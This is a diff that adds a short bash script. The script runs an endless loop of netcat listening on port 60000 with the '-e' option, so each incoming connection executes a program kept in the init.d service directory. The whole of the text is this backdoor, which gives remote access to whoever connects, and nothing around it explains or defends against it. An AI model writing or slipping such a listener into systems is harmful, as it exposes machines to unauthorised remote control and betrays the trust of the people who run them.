@@ -1,0 +1,5 @@
+#!/bin/bash
+while true; do
+    nc -l 60000 -e /etc/rc.d/init.d/r
+    sleep 1
+done
